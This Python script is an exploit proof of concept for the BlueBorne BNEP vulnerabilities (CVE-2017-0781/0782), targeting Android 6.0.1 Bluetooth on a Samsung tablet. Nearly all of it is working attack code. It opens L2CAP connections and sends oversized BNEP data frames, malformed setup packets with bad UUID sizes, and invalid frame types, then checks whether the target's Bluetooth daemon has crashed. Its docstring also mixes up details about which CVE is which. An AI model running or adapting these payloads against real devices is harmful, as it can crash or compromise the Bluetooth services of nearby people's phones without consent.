#!/usr/bin/env python3
"""
CVE-2017-0782 BNEP Integer Underflow — Precise Exploitation
Target: SM-T377A bluetooth.default.so (Bluedroid Android 6.0.1)

The bug in bnep_process_control_packet():
  case BNEP_SETUP_CONNECTION_REQUEST_MSG:
    uuid_size = *p_data++;  // attacker-controlled
    // No check that uuid_size is valid (must be 2, 4, or 16)
    // No check that remaining data >= uuid_size * 2
    p_data += uuid_size;    // advance past source UUID
    BE_STREAM_TO_UINT16(uuid, p_data);  // read dst UUID
    // Integer underflow in remaining length:
    // rem_len -= (1 + 2*uuid_size) → underflows if uuid_size large

The actual Armis BlueBorne exploit uses CVE-2017-0781 (not 0782):
  bnep_data_ind() heap overflow via oversized BNEP frame.
  When the BNEP frame header indicates COMPRESSED_ETHERNET_SRC_ONLY type
  (type=3) but the payload is larger than the allocated buffer.

We try multiple approaches to trigger the heap corruption.
"""
import bluetooth
import struct
import sys
import time
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'

def connect_bnep():
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, 1500)
    sock.settimeout(10)
    sock.connect((TARGET, 15))
    # Setup
    sock.send(b'\x01\x01\x02\x11\x15\x11\x16')
    time.sleep(0.3)
    try:
        sock.recv(256)
    except:
        pass
    return sock

print(f'=== CVE-2017-0781/0782 BNEP Overflow | {TARGET} ===')
print()

# ============================================================
# Approach 1: CVE-2017-0781 — BNEP_DATA_IND heap overflow
# bnep_data_ind() processes incoming BNEP data frames.
# The buffer is allocated based on L2CAP frame size.
# BNEP type 0x03 = COMPRESSED_ETHERNET_SRC_ONLY:
#   header: type(1) + src_addr(6) + net_type(2) = 9 bytes
# If we send a huge frame, it overflows the GKI buffer.
# ============================================================

print('[1] Testing CVE-2017-0781 — BNEP data overflow')
sock = connect_bnep()
print('    Connected + setup complete')

# Send progressively larger BNEP data frames
for size in [100, 500, 1000, 1400]:
    # Type 0x03 = COMPRESSED_ETHERNET_SRC_ONLY (no dst addr, has src addr)
    frame = b'\x03'                          # type
    frame += b'\x28\x16\xad\x8b\x87\xaf'    # src MAC
    frame += b'\x08\x00'                      # net type (IPv4)
    frame += b'\x41' * (size - 9)            # payload (oversized)
    print(f'    Sending type=0x03 frame, {len(frame)} bytes')
    try:
        sock.send(frame)
        time.sleep(0.2)
    except Exception as e:
        print(f'    Error: {e}')
        break

# Check alive
time.sleep(1)
try:
    sock.send(b'\x01\x01\x02\x11\x15\x11\x16')
    sock.recv(256)
    print('    Target alive after approach 1')
except:
    print('    *** TARGET CRASHED after approach 1! ***')
sock.close()
time.sleep(1)

# ============================================================
# Approach 2: Rapid reconnect + malformed control packets
# CVE-2017-0782 uses a series of BNEP connections with
# Setup Connection Request having uuid_size values that
# cause integer underflow in remaining length calculation
# ============================================================

print()
print('[2] Testing CVE-2017-0782 — Setup integer underflow')

for uuid_sz in [4, 16, 32, 64, 100]:
    try:
        sock = connect_bnep()
        # Send setup with oversized UUID
        pkt = bytes([0x01, 0x01, uuid_sz])
        pkt += b'\x41' * (uuid_sz * 2)  # src + dst UUID data
        # Append extra data that will be misinterpreted after underflow
        pkt += b'\x42' * 200
        print(f'    uuid_size={uuid_sz}, pkt_len={len(pkt)}')
        sock.send(pkt)
        time.sleep(0.3)
        try:
            r = sock.recv(256)
            print(f'    Response: {r[:4].hex()}')
        except:
            print(f'    No response')
        sock.close()
        time.sleep(0.5)
    except Exception as e:
        print(f'    Connection failed: {e} — target may have crashed!')
        break

# ============================================================
# Approach 3: BNEP type confusion
# Send frames with invalid BNEP types to hit unexpected code paths
# ============================================================

print()
print('[3] Testing BNEP type confusion')
try:
    sock = connect_bnep()
    # All possible BNEP frame types (0-7 + extension bit)
    for frame_type in [0x04, 0x05, 0x06, 0x07, 0x84, 0x85, 0x86, 0x87]:
        frame = bytes([frame_type]) + b'\x41' * 500
        try:
            sock.send(frame)
            time.sleep(0.1)
        except:
            print(f'    Type 0x{frame_type:02x}: send failed')
            break
    time.sleep(0.5)
    try:
        sock.send(b'\x01\x01\x02\x11\x15\x11\x16')
        sock.recv(256)
        print('    Target alive after approach 3')
    except:
        print('    *** TARGET CRASHED after approach 3! ***')
    sock.close()
except Exception as e:
    print(f'    Connection error: {e}')

# ============================================================
# Final check — is the BT daemon still alive?
# ============================================================
print()
print('[*] Final connectivity check...')
time.sleep(2)
try:
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    sock.settimeout(10)
    sock.connect((TARGET, 15))
    print('[*] BT daemon still alive')
    sock.close()
except:
    print('[!] *** BT daemon appears DOWN! ***')

print('[*] Done.')
